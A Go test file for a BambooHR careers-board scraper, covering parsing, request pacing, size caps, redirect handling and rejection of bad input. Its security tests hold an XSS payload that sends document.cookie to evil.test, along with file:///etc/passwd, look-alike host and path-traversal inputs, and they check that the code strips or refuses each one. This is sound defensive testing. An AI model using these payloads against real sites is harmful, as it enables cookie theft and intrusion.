package bamboohr

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/bharathvbcr/Vani/internal/egress"
	"github.com/bharathvbcr/Vani/internal/posting"
	"github.com/bharathvbcr/Vani/internal/sources"
	"github.com/bharathvbcr/Vani/internal/sources/srctest"
	"github.com/bharathvbcr/Vani/internal/sources/srcutil"
)

var fixedNow = time.Date(2026, 10, 27, 9, 0, 0, 0, time.UTC)

const (
	listEndpoint = "https://sortitt.bamboohr.com/careers/list"
	detailBase   = "https://sortitt.bamboohr.com/careers/"
)

var board = sources.Board{ATS: posting.BambooHR, Token: "sortitt", Company: "Sortitt"}

// waits records the spacing the board asked for, without waiting.
type waits struct {
	mu sync.Mutex
	d  []time.Duration
}

func (w *waits) wait(ctx context.Context, d time.Duration) error {
	w.mu.Lock()
	w.d = append(w.d, d)
	w.mu.Unlock()
	return ctx.Err()
}

func newSource(d egress.Doer) (*source, *waits) {
	w := &waits{}
	return &source{d: d, now: func() time.Time { return fixedNow }, wait: w.wait}, w
}

func ok(body string) srctest.Reply { return srctest.Reply{Status: 200, Body: []byte(body)} }

func read(t *testing.T, name string) string {
	t.Helper()
	raw, err := os.ReadFile("testdata/" + name)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// site serves a list and details by id; an id with no detail is a 404, and
// bad replaces a detail's reply.
func site(list string, details map[string]string, bad map[string]srctest.Reply) *srctest.Doer {
	return srctest.NewFunc(func(r srctest.Request) (srctest.Reply, bool) {
		if r.URL == listEndpoint {
			return ok(list), true
		}
		rest, found := strings.CutPrefix(r.URL, detailBase)
		id, found2 := strings.CutSuffix(rest, "/detail")
		if !found || !found2 {
			return srctest.Reply{}, false
		}
		if rep, hit := bad[id]; hit {
			return rep, true
		}
		if body, has := details[id]; has {
			return ok(body), true
		}
		return srctest.Reply{Status: 404, Body: []byte(`{}`)}, true
	})
}

func fixtureSite(t *testing.T) *srctest.Doer {
	return site(read(t, "list.json"), map[string]string{
		"76": read(t, "detail-76.json"), "88": read(t, "detail-88.json"), "111": read(t, "detail-111.json"),
	}, nil)
}

// listJSON is a list of n jobs "1".."n" whose totalCount is count.
func listJSON(count int, ids ...string) string {
	var sb strings.Builder
	for i, id := range ids {
		if i > 0 {
			sb.WriteByte(',')
		}
		fmt.Fprintf(&sb, `{"id":%q,"jobOpeningName":"Job %s","departmentLabel":"Eng","employmentStatusLabel":"Full-Time","isRemote":null,"locationType":"0","location":{"city":"Berlin","state":null}}`, id, id)
	}
	return fmt.Sprintf(`{"meta":{"totalCount":%d},"result":[%s]}`, count, sb.String())
}

// detailJSON is one valid detail with its job-opening fields given as raw JSON members.
func detailJSON(id, extra string) string {
	return fmt.Sprintf(`{"result":{"jobOpening":{"jobOpeningShareUrl":"https://sortitt.bamboohr.com/careers/%s","jobOpeningName":"Job %s","jobOpeningStatus":"Open","description":"<p>Body %s</p>"%s}}}`, id, id, id, extra)
}

func one(t *testing.T, listExtra, detailExtra string) posting.Posting {
	t.Helper()
	list := strings.Replace(listJSON(1, "1"), `"locationType":"0"`, listExtra, 1)
	s, _ := newSource(site(list, map[string]string{"1": detailJSON("1", detailExtra)}, nil))
	got, err := s.List(context.Background(), board)
	if err != nil || len(got) != 1 {
		t.Fatalf("got %v, %v", got, err)
	}
	return got[0]
}

func TestFixture(t *testing.T) {
	d := fixtureSite(t)
	s, w := newSource(d)
	got, err := s.List(context.Background(), board)
	if err != nil {
		t.Fatal(err)
	}
	want := []struct {
		p      posting.Posting
		prefix string
	}{
		{posting.Posting{
			Key: "bh:sortitt:76", ATS: posting.BambooHR, Company: "Sortitt",
			Title: "Software Developer (Freelance)", Department: "Development & Technology", Remote: true,
			URL: "https://sortitt.bamboohr.com/careers/76", PostedAt: time.Date(2024, 1, 16, 0, 0, 0, 0, time.UTC), SeenAt: fixedNow,
		}, "Role: part-time, remote\n\nPosition Title: Software Developer (Freelance)\nLocation: Remote\nAbout Us: Welcome to Sortitt"},
		{posting.Posting{
			Key: "bh:sortitt:88", ATS: posting.BambooHR, Company: "Sortitt",
			Title: "Technology Lead", Location: "Karachi, Sindh, Pakistan", Department: "Development & Technology",
			URL: "https://sortitt.bamboohr.com/careers/88", PostedAt: time.Date(2024, 3, 2, 0, 0, 0, 0, time.UTC), SeenAt: fixedNow,
		}, "Role: full-time, hybrid\n\nAbout the role: lead the technology team & ship.\nHybrid, 3 days in office"},
		{posting.Posting{
			Key: "bh:sortitt:111", ATS: posting.BambooHR, Company: "Sortitt",
			Title: "Flutter Developer", Location: "Karachi, Sindh, Pakistan", Department: "Development & Technology",
			URL: "https://sortitt.bamboohr.com/careers/111", PostedAt: time.Date(2024, 5, 20, 0, 0, 0, 0, time.UTC), SeenAt: fixedNow,
		}, "Compensation: PKR 400,000 - 600,000 per month\nRole: full-time, on-site\n\nBuild Flutter apps."},
	}
	if len(got) != len(want) {
		t.Fatalf("got %d postings, want %d", len(got), len(want))
	}
	for i, w := range want {
		g := got[i]
		desc := g.Description
		g.Description = ""
		if g != w.p {
			t.Errorf("posting %d\n got %+v\nwant %+v", i, g, w.p)
		}
		if !strings.HasPrefix(desc, w.prefix) {
			t.Errorf("posting %d description starts %.140q, want prefix %q", i, desc, w.prefix)
		}
		if strings.ContainsAny(desc, "<>") || len(desc) > srcutil.MaxDescription {
			t.Errorf("posting %d description carries markup or is %d bytes", i, len(desc))
		}
	}
	// One list, then each detail once, in list order.
	wantURLs := []string{listEndpoint, detailBase + "76/detail", detailBase + "88/detail", detailBase + "111/detail"}
	if u := d.URLs(); strings.Join(u, " ") != strings.Join(wantURLs, " ") {
		t.Fatalf("requested %v, want %v", u, wantURLs)
	}
	// Every request after the first is spaced; the first is not.
	if len(w.d) != 3 || w.d[0] != paceEvery || w.d[2] != paceEvery {
		t.Fatalf("spacing %v, want three waits of %s", w.d, paceEvery)
	}
	if (&source{}).ATS() != posting.BambooHR {
		t.Fatal("ATS")
	}
}

func TestEmptyBoardIsValid(t *testing.T) {
	d := site(`{"meta":{"totalCount":0},"result":[]}`, nil, nil)
	s, _ := newSource(d)
	got, err := s.List(context.Background(), board)
	if err != nil || got == nil || len(got) != 0 {
		t.Fatalf("got %#v, %v", got, err)
	}
	if n := len(d.URLs()); n != 1 {
		t.Fatalf("%d requests for an empty board", n)
	}
}

func TestWorkSite(t *testing.T) {
	for name, tc := range map[string]struct {
		list, detail string
		want         string
		remote       bool
	}{
		"onsite":                   {`"locationType":"0"`, ``, "Role: full-time, on-site\n\nBody 1", false},
		"remote":                   {`"locationType":"1"`, ``, "Role: full-time, remote\n\nBody 1", true},
		"hybrid":                   {`"locationType":"2"`, ``, "Role: full-time, hybrid\n\nBody 1", false},
		"unknown value":            {`"locationType":"7"`, ``, "Role: full-time\n\nBody 1", false},
		"number not string":        {`"locationType":1`, ``, "Role: full-time, remote\n\nBody 1", true},
		"null":                     {`"locationType":null`, ``, "Role: full-time\n\nBody 1", false},
		"junk type":                {`"locationType":{"a":1}`, ``, "Role: full-time\n\nBody 1", false},
		"list wins":                {`"locationType":"2"`, `,"locationType":"1"`, "Role: full-time, hybrid\n\nBody 1", false},
		"detail when list is none": {`"locationType":null`, `,"locationType":"1"`, "Role: full-time, remote\n\nBody 1", true},
		"isRemote fallback":        {`"locationType":null,"isRemote":true`, ``, "Role: full-time, remote\n\nBody 1", true},
		"padded":                   {`"locationType":" 1 "`, ``, "Role: full-time, remote\n\nBody 1", true},
	} {
		p := one(t, tc.list, tc.detail)
		if p.Description != tc.want || p.Remote != tc.remote {
			t.Errorf("%s: description %q remote %v, want %q %v", name, p.Description, p.Remote, tc.want, tc.remote)
		}
	}
}

func TestEmploymentCompensationAndLocation(t *testing.T) {
	for name, tc := range map[string]struct {
		detail, want, location string
	}{
		"label from the detail":       {`,"employmentStatusLabel":"Part-Time"`, "Role: part-time, on-site\n\nBody 1", "Berlin"},
		"contractor":                  {`,"employmentStatusLabel":"Contractor"`, "Role: contract, on-site\n\nBody 1", "Berlin"},
		"free label":                  {`,"employmentStatusLabel":"Seasonal  Worker"`, "Role: Seasonal Worker, on-site\n\nBody 1", "Berlin"},
		"compensation text":           {`,"compensation":"  USD 90,000 - 110,000 a year "`, "Compensation: USD 90,000 - 110,000 a year\nRole: full-time, on-site\n\nBody 1", "Berlin"},
		"compensation number":         {`,"compensation":90000`, "Compensation: 90000\nRole: full-time, on-site\n\nBody 1", "Berlin"},
		"compensation object":         {`,"compensation":{"min":1}`, "Role: full-time, on-site\n\nBody 1", "Berlin"},
		"compensation null":           {`,"compensation":null`, "Role: full-time, on-site\n\nBody 1", "Berlin"},
		"compensation newline":        {`,"compensation":"a\nb"`, "Compensation: a b\nRole: full-time, on-site\n\nBody 1", "Berlin"},
		"detail location":             {`,"location":{"city":"Lyon","state":"ARA","addressCountry":"France"}`, "Role: full-time, on-site\n\nBody 1", "Lyon, ARA, France"},
		"same city and state":         {`,"location":{"city":"Singapore","state":"singapore","addressCountry":"Singapore"}`, "Role: full-time, on-site\n\nBody 1", "Singapore"},
		"null location in the detail": {`,"location":{"city":null,"state":null,"addressCountry":null}`, "Role: full-time, on-site\n\nBody 1", "Berlin"},
		"unicode location":            {`,"location":{"city":"Zürich","state":null,"addressCountry":"Schweiz 🇨🇭"}`, "Role: full-time, on-site\n\nBody 1", "Zürich, Schweiz 🇨🇭"},
	} {
		p := one(t, `"locationType":"0"`, tc.detail)
		if p.Description != tc.want || p.Location != tc.location {
			t.Errorf("%s: description %q location %q, want %q %q", name, p.Description, p.Location, tc.want, tc.location)
		}
	}
}

func TestDatePosted(t *testing.T) {
	if p := one(t, `"locationType":"0"`, `,"datePosted":"2025-02-28"`); !p.PostedAt.Equal(time.Date(2025, 2, 28, 0, 0, 0, 0, time.UTC)) {
		t.Errorf("posted %v", p.PostedAt)
	}
	for _, extra := range []string{`,"datePosted":null`, `,"datePosted":""`, `,"datePosted":" "`} {
		if p := one(t, `"locationType":"0"`, extra); !p.PostedAt.IsZero() {
			t.Errorf("%s: posted %v, want the zero time", extra, p.PostedAt)
		}
	}
	for _, bad := range []string{"yesterday", "2025-2-8", "2025-02-30", "2025-02-28T00:00:00Z", "28/02/2025", "1790000000"} {
		s, _ := newSource(site(listJSON(1, "1"), map[string]string{"1": detailJSON("1", `,"datePosted":"`+bad+`"`)}, nil))
		if got, err := s.List(context.Background(), board); err == nil {
			t.Errorf("datePosted %q accepted: %+v", bad, got)
		}
	}
}

func TestOnlyOpenPostingsAreListed(t *testing.T) {
	details := map[string]string{
		"1": detailJSON("1", ""),
		"2": strings.Replace(detailJSON("2", ""), `"Open"`, `"Draft"`, 1),
		"3": strings.Replace(detailJSON("3", ""), `"Open"`, `"OPEN"`, 1),
		"4": strings.Replace(detailJSON("4", ""), `"jobOpeningStatus":"Open",`, ``, 1),
	}
	s, _ := newSource(site(listJSON(4, "1", "2", "3", "4"), details, nil))
	got, err := s.List(context.Background(), board)
	if err != nil {
		t.Fatal(err)
	}
	var keys []string
	for _, p := range got {
		keys = append(keys, string(p.Key))
	}
	if want := "bh:sortitt:1 bh:sortitt:3 bh:sortitt:4"; strings.Join(keys, " ") != want {
		t.Fatalf("listed %v, want %s", keys, want)
	}
}

func TestHTMLInjection(t *testing.T) {
	const evil = `<p>Real text</p><script>fetch('https://evil.test/?'+document.cookie)</script>` +
		`<img src=x onerror="alert(1)"><style>body{display:none}</style><!-- hidden -->` +
		`<a href="javascript:alert(1)">click</a>&lt;script&gt;alert(2)&lt;/script&gt;`
	detail := strings.Replace(detailJSON("1", ""), `<p>Body 1</p>`, strings.ReplaceAll(evil, `"`, `\"`), 1)
	s, _ := newSource(site(listJSON(1, "1"), map[string]string{"1": detail}, nil))
	got, err := s.List(context.Background(), board)
	if err != nil {
		t.Fatal(err)
	}
	d := got[0].Description
	for _, bad := range []string{"fetch(", "evil.test/?", "onerror", "display:none", "hidden", "<img"} {
		if strings.Contains(d, bad) {
			t.Errorf("description kept %q: %q", bad, d)
		}
	}
	if want := "Role: full-time, on-site\n\nReal text\nclick<script>alert(2)</script>"; d != want {
		t.Errorf("description %q, want %q", d, want)
	}
}

func TestDescriptionCapKeepsTheLead(t *testing.T) {
	huge := strings.Repeat("lorem ", 100<<10/6)
	detail := strings.Replace(detailJSON("1", `,"compensation":"USD 1-2"`), `<p>Body 1</p>`, `<p>`+huge+`</p>`, 1)
	s, _ := newSource(site(listJSON(1, "1"), map[string]string{"1": detail}, nil))
	got, err := s.List(context.Background(), board)
	if err != nil {
		t.Fatal(err)
	}
	d := got[0].Description
	if n := len(d); n == 0 || n > srcutil.MaxDescription {
		t.Fatalf("description %d bytes, want 1..%d", n, srcutil.MaxDescription)
	}
	if !strings.HasPrefix(d, "Compensation: USD 1-2\nRole: full-time, on-site\n\nlorem") {
		t.Fatalf("lead cut: %.80q", d)
	}
}

// ---- the list ----

func TestListPayloadsThatAreNotAWholeBoard(t *testing.T) {
	for name, body := range map[string]string{
		"empty body":           ``,
		"null":                 `null`,
		"html":                 `<html><body>Sign in</body></html>`,
		"truncated":            `{"meta":{"totalCount":1},"result":[{"id":"1"`,
		"no result":            `{"meta":{"totalCount":0}}`,
		"result null":          `{"meta":{"totalCount":0},"result":null}`,
		"result is an object":  `{"meta":{"totalCount":0},"result":{}}`,
		"no meta":              `{"result":[]}`,
		"no totalCount":        `{"meta":{},"result":[]}`,
		"count above the list": strings.Replace(listJSON(2, "1"), `"totalCount":2`, `"totalCount":9`, 1),
		"count below the list": listJSON(1, "1", "2"),
		"count is a string":    `{"meta":{"totalCount":"1"},"result":[]}`,
		"negative count":       `{"meta":{"totalCount":-1},"result":[]}`,
		"element is a number":  `{"meta":{"totalCount":1},"result":[1]}`,
		"id is a number":       `{"meta":{"totalCount":1},"result":[{"id":1,"jobOpeningName":"T"}]}`,
		"missing id":           `{"meta":{"totalCount":1},"result":[{"jobOpeningName":"T"}]}`,
		"blank id":             `{"meta":{"totalCount":1},"result":[{"id":" ","jobOpeningName":"T"}]}`,
		"id with separator":    `{"meta":{"totalCount":1},"result":[{"id":"1:2","jobOpeningName":"T"}]}`,
		"duplicate id":         listJSON(2, "7", "7"),
		"duplicate by padding": listJSON(2, "7", " 7 "),
	} {
		t.Run(name, func(t *testing.T) {
			d := site(body, map[string]string{"1": detailJSON("1", ""), "7": detailJSON("7", "")}, nil)
			s, _ := newSource(d)
			if got, err := s.List(context.Background(), board); err == nil || got != nil {
				t.Fatalf("want an error, got %d postings, %v", len(got), err)
			}
			// Nothing is read of a list that is not shown whole.
			if n := len(d.URLs()); n != 1 {
				t.Errorf("%d requests, want only the list: %v", n, d.URLs())
			}
		})
	}
}

func TestMoreThanMaxDetailsFailsBeforeAnyDetail(t *testing.T) {
	ids := make([]string, maxDetails+1)
	for i := range ids {
		ids[i] = fmt.Sprint(i + 1)
	}
	d := site(listJSON(len(ids), ids...), nil, nil)
	s, _ := newSource(d)
	got, err := s.List(context.Background(), board)
	if !errors.Is(err, srcutil.ErrTooManyPostings) || got != nil || len(d.URLs()) != 1 {
		t.Fatalf("got %v, %v after %d requests", got, err, len(d.URLs()))
	}
}

func TestMaxDetailsBoardIsRead(t *testing.T) {
	ids := make([]string, maxDetails)
	details := map[string]string{}
	for i := range ids {
		ids[i] = fmt.Sprint(i + 1)
		details[ids[i]] = detailJSON(ids[i], "")
	}
	d := site(listJSON(len(ids), ids...), details, nil)
	s, w := newSource(d)
	got, err := s.List(context.Background(), board)
	if err != nil || len(got) != maxDetails || len(d.URLs()) != maxDetails+1 || len(w.d) != maxDetails {
		t.Fatalf("got %d postings, %v, %d requests, %d waits", len(got), err, len(d.URLs()), len(w.d))
	}
}

func TestPostingCap(t *testing.T) {
	ids := make([]string, srcutil.MaxPostings+1)
	for i := range ids {
		ids[i] = fmt.Sprint(i + 1)
	}
	d := site(listJSON(len(ids), ids...), nil, nil)
	s, _ := newSource(d)
	if got, err := s.List(context.Background(), board); !errors.Is(err, srcutil.ErrTooManyPostings) || got != nil || len(d.URLs()) != 1 {
		t.Fatalf("got %v, %v after %d requests", got, err, len(d.URLs()))
	}
}

func TestListBodyCap(t *testing.T) {
	old := maxListBody
	maxListBody = 256
	defer func() { maxListBody = old }()
	d := site(listJSON(1, "1")+strings.Repeat(" ", 300), map[string]string{"1": detailJSON("1", "")}, nil)
	s, _ := newSource(d)
	if got, err := s.List(context.Background(), board); !errors.Is(err, srcutil.ErrBodyTooLarge) || got != nil {
		t.Fatalf("got %v, %v, want ErrBodyTooLarge", got, err)
	}
}

// ---- the detail: any detail that cannot be read fails the board ----

func TestADetailThatCannotBeReadFailsTheBoard(t *testing.T) {
	ids := []string{"1", "2", "3", "4"}
	details := map[string]string{}
	for _, id := range ids {
		details[id] = detailJSON(id, "")
	}
	for name, rep := range map[string]srctest.Reply{
		"404":                  {Status: 404, Body: []byte(`{}`)},
		"410":                  {Status: 410, Body: []byte(`{}`)},
		"429":                  {Status: 429, Header: http.Header{"Retry-After": {"0"}}},
		"500":                  {Status: 500, Body: []byte(`{}`)},
		"503":                  {Status: 503, Body: []byte(`{}`), Header: http.Header{"Retry-After": {"0"}}},
		"redirect":             {Status: 302, Header: http.Header{"Location": {"https://www.bamboohr.com"}}},
		"malformed":            ok(`{not json`),
		"html page":            ok(`<html><body>Sign in</body></html>`),
		"empty body":           ok(``),
		"null":                 ok(`null`),
		"empty object":         ok(`{}`),
		"null job opening":     ok(`{"result":{"jobOpening":null}}`),
		"no share url":         ok(strings.Replace(detailJSON("2", ""), `"jobOpeningShareUrl":"https://sortitt.bamboohr.com/careers/2",`, ``, 1)),
		"blank share url":      ok(strings.Replace(detailJSON("2", ""), `"jobOpeningShareUrl":"https://sortitt.bamboohr.com/careers/2"`, `"jobOpeningShareUrl":"  "`, 1)),
		"file share url":       ok(strings.Replace(detailJSON("2", ""), `https://sortitt.bamboohr.com/careers/2`, `file:///etc/passwd`, 1)),
		"userinfo share url":   ok(strings.Replace(detailJSON("2", ""), `https://sortitt.bamboohr.com/careers/2`, `https://sortitt.bamboohr.com@evil.test/x`, 1)),
		"oversized":            ok(`{"result":{"jobOpening":{"jobOpeningShareUrl":"https://x.test/1","description":"` + strings.Repeat("x", int(maxDetailBody)) + `"}}}`),
		"description is a num": ok(strings.Replace(detailJSON("2", ""), `"description":"<p>Body 2</p>"`, `"description":5`, 1)),
		"bad date":             ok(detailJSON("2", `,"datePosted":"soon"`)),
		"blank title":          ok(detailJSON("2", ``)),
	} {
		t.Run(name, func(t *testing.T) {
			list := listJSON(4, ids...)
			if name == "blank title" {
				list = strings.Replace(list, `"jobOpeningName":"Job 2"`, `"jobOpeningName":" "`, 1)
				rep = ok(strings.Replace(detailJSON("2", ""), `"jobOpeningName":"Job 2"`, `"jobOpeningName":""`, 1))
			}
			d := site(list, details, map[string]srctest.Reply{"2": rep})
			s, _ := newSource(d)
			got, err := s.List(context.Background(), board)
			if err == nil || got != nil {
				t.Fatalf("got %d postings, %v; want the board to fail", len(got), err)
			}
			// A detail is never read as the board being gone, and the board
			// stops at the first one it cannot read.
			if errors.Is(err, ErrBoardNotFound) {
				t.Errorf("read as board-not-found: %v", err)
			}
			if !strings.Contains(err.Error(), "job 1") {
				t.Errorf("error does not name the job: %v", err)
			}
			for _, u := range d.URLs() {
				if strings.HasSuffix(u, "/3/detail") || strings.HasSuffix(u, "/4/detail") {
					t.Errorf("read on after the failure: %s", u)
				}
			}
		})
	}
}

func TestDetailURLEscapesTheID(t *testing.T) {
	var asked []string
	d := srctest.NewFunc(func(r srctest.Request) (srctest.Reply, bool) {
		if r.URL == listEndpoint {
			return ok(listJSON(1, "1/../x?a=1#f")), true
		}
		asked = append(asked, r.URL)
		return ok(detailJSON("1", "")), true
	})
	s, _ := newSource(d)
	if _, err := s.List(context.Background(), board); err != nil {
		t.Fatal(err)
	}
	if want := detailBase + "1%2F..%2Fx%3Fa=1%23f/detail"; len(asked) != 1 || asked[0] != want {
		t.Fatalf("asked %v, want %s", asked, want)
	}
}

// ---- a board BambooHR does not serve ----

// answerDoer answers every request with resp, whatever it was.
type answerDoer struct {
	resp func(*http.Request) (*http.Response, error)
}

func (a answerDoer) Do(_ context.Context, req *http.Request) (*http.Response, error) {
	return a.resp(req)
}

func responseAt(req *http.Request, at string, status int, body string, hdr http.Header) *http.Response {
	u, _ := url.Parse(at)
	if hdr == nil {
		hdr = http.Header{}
	}
	return &http.Response{StatusCode: status, Header: hdr, Body: io.NopCloser(bytes.NewReader([]byte(body))), Request: &http.Request{URL: u, Method: req.Method}}
}

func TestRedirectAwayFromCareersIsABoardNotFound(t *testing.T) {
	for name, tc := range map[string]struct {
		do   func(*http.Request) (*http.Response, error)
		dest string
	}{
		"unfollowed 302 to the marketing site": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, listEndpoint, 302, "", http.Header{"Location": {"https://www.bamboohr.com"}}), nil
		}, "www.bamboohr.com"},
		"unfollowed 301 with a query": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, listEndpoint, 301, "", http.Header{"Location": {"https://sortitt.bamboohr.com/login.php?next=%2Fcareers&token=secret"}}), nil
		}, "sortitt.bamboohr.com/login.php"},
		"unfollowed redirect with no Location": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, listEndpoint, 302, "", nil), nil
		}, `""`},
		"followed to the login page": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, "https://sortitt.bamboohr.com/login.php?x=secret", 200, `<html>Log in</html>`, nil), nil
		}, "sortitt.bamboohr.com/login.php"},
		"followed to a suspended page": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, "https://sortitt.bamboohr.com/settings/account/temporarily_suspended", 200, `<html>x</html>`, nil), nil
		}, "temporarily_suspended"},
		"followed to the marketing site": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, "https://www.bamboohr.com/", 200, `<html>BambooHR</html>`, nil), nil
		}, "www.bamboohr.com"},
		"followed to a look-alike host": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, "https://sortitt.bamboohr.com.evil.test/careers/list", 200, listJSON(0), nil), nil
		}, "sortitt.bamboohr.com.evil.test"},
		"followed to another tenant": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, "https://other.bamboohr.com/careers/list", 200, listJSON(0), nil), nil
		}, "other.bamboohr.com"},
		"followed to a path that only starts like careers": {func(r *http.Request) (*http.Response, error) {
			return responseAt(r, "https://sortitt.bamboohr.com/careersx/list", 200, listJSON(0), nil), nil
		}, "/careersx/list"},
		"hop to a host that is not allowed": {func(r *http.Request) (*http.Response, error) {
			return nil, &url.Error{Op: "Get", URL: listEndpoint, Err: fmt.Errorf("%w: %q", egress.ErrNotAllowed, "www.bamboohr.com")}
		}, "not allowed"},
	} {
		t.Run(name, func(t *testing.T) {
			s, _ := newSource(answerDoer{tc.do})
			got, err := s.List(context.Background(), board)
			if !errors.Is(err, ErrBoardNotFound) || got != nil {
				t.Fatalf("got %v, %v, want ErrBoardNotFound", got, err)
			}
			if !strings.Contains(err.Error(), tc.dest) {
				t.Errorf("error does not say where it went (%s): %v", tc.dest, err)
			}
			// Query strings of the redirect are not put in the error.
			if strings.Contains(err.Error(), "secret") {
				t.Errorf("error carries the redirect's query: %v", err)
			}
		})
	}
}

func TestRedirectsThatStayOnTheCareersPageAreFine(t *testing.T) {
	for _, at := range []string{
		"https://sortitt.bamboohr.com/careers/list",
		"https://sortitt.bamboohr.com/careers/list/",
		"https://SORTITT.bamboohr.com/careers",
		"https://sortitt.bamboohr.com/careers/",
	} {
		s, _ := newSource(answerDoer{func(r *http.Request) (*http.Response, error) {
			if strings.HasSuffix(r.URL.Path, "/detail") {
				return responseAt(r, r.URL.String(), 200, detailJSON("1", ""), nil), nil
			}
			return responseAt(r, at, 200, listJSON(1, "1"), nil), nil
		}})
		got, err := s.List(context.Background(), board)
		if err != nil || len(got) != 1 {
			t.Errorf("%s: got %v, %v", at, got, err)
		}
	}
}

// The board's own host being refused is not a redirect, and not a board that
// is gone: it is a host the owner did not allow.
func TestTheBoardsOwnHostNotAllowedIsNotGone(t *testing.T) {
	s, _ := newSource(answerDoer{func(*http.Request) (*http.Response, error) {
		return nil, fmt.Errorf("%w: %q", egress.ErrNotAllowed, "sortitt.bamboohr.com")
	}})
	got, err := s.List(context.Background(), board)
	if err == nil || got != nil || errors.Is(err, ErrBoardNotFound) || !errors.Is(err, egress.ErrNotAllowed) {
		t.Fatalf("got %v, %v", got, err)
	}
}

func TestStatusOfTheList(t *testing.T) {
	for _, tc := range []struct {
		status int
		gone   bool
	}{{404, true}, {410, false}, {429, false}, {500, false}, {502, false}, {503, false}} {
		d := srctest.New(map[string]srctest.Reply{listEndpoint: {Status: tc.status, Body: []byte(listJSON(0)), Header: http.Header{"Retry-After": {"0"}}}})
		s, _ := newSource(d)
		got, err := s.List(context.Background(), board)
		if err == nil || got != nil || errors.Is(err, ErrBoardNotFound) != tc.gone {
			t.Errorf("status %d: got %v, %v (gone want %v)", tc.status, got, err, tc.gone)
		}
	}
}

// ---- time ----

type blockedDoer struct{}

func (blockedDoer) Do(ctx context.Context, _ *http.Request) (*http.Response, error) {
	<-ctx.Done()
	return nil, ctx.Err()
}

func TestTimeoutIsAnError(t *testing.T) {
	s, _ := newSource(blockedDoer{})
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()
	got, err := s.List(ctx, board)
	if !errors.Is(err, context.DeadlineExceeded) || got != nil {
		t.Fatalf("got %v, %v, want a deadline error and no postings", got, err)
	}
}

func TestCancelledContextStopsTheDetails(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	d := site(listJSON(3, "1", "2", "3"), map[string]string{"1": detailJSON("1", ""), "2": detailJSON("2", ""), "3": detailJSON("3", "")}, nil)
	n := 0
	s := &source{d: d, now: time.Now, wait: func(ctx context.Context, _ time.Duration) error {
		n++
		if n == 2 {
			cancel()
		}
		return ctx.Err()
	}}
	got, err := s.List(ctx, board)
	if !errors.Is(err, context.Canceled) || got != nil {
		t.Fatalf("got %v, %v", got, err)
	}
	if u := d.URLs(); len(u) != 2 {
		t.Fatalf("requested %v, want the list and the first detail only", u)
	}
	if _, err := s.List(ctx, board); !errors.Is(err, context.Canceled) {
		t.Fatalf("a cancelled context still listed: %v", err)
	}
}

// TestPacingBudgetStopsAtTheCap: the pacer, not the cap check alone, bounds a
// board's requests, so a board cannot be made to wait past its budget.
func TestPacingBudgetIsTheBoardsBound(t *testing.T) {
	if got := time.Duration(maxDetails) * paceEvery; got > 5*time.Minute {
		t.Fatalf("a full board waits %s in all", got)
	}
}

func TestWrongATSAndBadTokensRefused(t *testing.T) {
	d := srctest.New(nil)
	s, _ := newSource(d)
	for _, b := range []sources.Board{
		{ATS: posting.Recruitee, Token: "sortitt"},
		{ATS: posting.BambooHR, Token: ""},
		{ATS: posting.BambooHR, Token: ".."},
		{ATS: posting.BambooHR, Token: "a.b"},
		{ATS: posting.BambooHR, Token: "evil.example"},
		{ATS: posting.BambooHR, Token: "a/b"},
		{ATS: posting.BambooHR, Token: "A"},
		{ATS: posting.BambooHR, Token: "sortitt", BoardName: "Sortitt"},
		{Token: "sortitt"},
	} {
		if _, err := s.List(context.Background(), b); err == nil {
			t.Errorf("board %+v accepted", b)
		}
	}
	if n := len(d.URLs()); n != 0 {
		t.Errorf("refused boards still made %d requests", n)
	}
}

func TestNewAndNewWith(t *testing.T) {
	if New(nil).ATS() != posting.BambooHR || NewWith(nil, Options{}).ATS() != posting.BambooHR {
		t.Fatal("ATS")
	}
	if _, err := New(nil).List(context.Background(), board); err == nil {
		t.Fatal("nil doer must error, not panic")
	}
	if s, ok := NewWith(nil, Options{}).(*source); !ok || s.wait == nil {
		t.Fatal("NewWith left the spacing unset")
	}
}

func TestUnicodeTitleIsCleaned(t *testing.T) {
	list := strings.Replace(listJSON(1, "1"), `"Job 1"`, `"  Ingénieur Logiciel – 日本語 &amp; Co  "`, 1)
	s, _ := newSource(site(list, map[string]string{"1": detailJSON("1", "")}, nil))
	got, err := s.List(context.Background(), board)
	if err != nil || got[0].Title != "Ingénieur Logiciel – 日本語 & Co" {
		t.Fatalf("got %+v, %v", got, err)
	}
}
